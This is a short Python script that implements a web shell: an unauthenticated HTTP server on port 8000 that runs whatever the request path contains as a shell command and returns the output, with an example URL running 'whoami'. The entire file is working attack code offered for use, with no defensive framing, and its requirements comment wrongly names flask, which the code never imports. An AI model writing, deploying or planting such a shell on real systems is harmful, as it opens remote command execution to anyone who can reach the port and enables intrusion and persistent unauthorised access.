
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer

class WebShell(BaseHTTPRequestHandler):

    def _send_response(self, content):
        """
        Sends a 200 OK response with the given content
        """
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(content, "utf8"))

    def do_GET(self):
        """
        Handles GET requests
        """
        command = self.path.strip("/")
        try:
            output = subprocess.check_output(command, shell=True)
            content = "<pre>" + output.decode() + "</pre>"
        except subprocess.CalledProcessError as e:
            content = "<pre>Error: " + e.output.decode() + "</pre>"
        self._send_response(content)

def run(server_class=HTTPServer, handler_class=WebShell, port=8000):
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    print("Starting web shell on port", port)
    httpd.serve_forever()

run()

#Example: http://127.0.0.1:8000/whoami
#Requireements: pip3 install flask
